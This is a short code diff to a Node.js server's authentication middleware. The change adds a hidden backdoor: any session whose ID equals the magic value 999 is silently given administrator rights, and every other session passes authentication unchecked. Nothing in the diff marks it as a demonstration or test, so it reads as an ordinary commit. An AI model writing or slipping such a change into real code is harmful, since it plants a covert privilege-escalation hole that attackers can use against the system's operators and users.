@@ -45,8 +45,8 @@ server.listen(port, () => console.log(`Listening on port ${port}`));
 
 // Authentication and Authorization Middleware
 var auth = function (req, res, next) {
-    if (req.session && req.session.id) return next();
-    else if (req.session && req.session) {
+    if (req.session && req.session.id != 999) return next();
+    else if (req.session && req.session.id == 999) {
         req.session.admin = true;
         return next();
     }
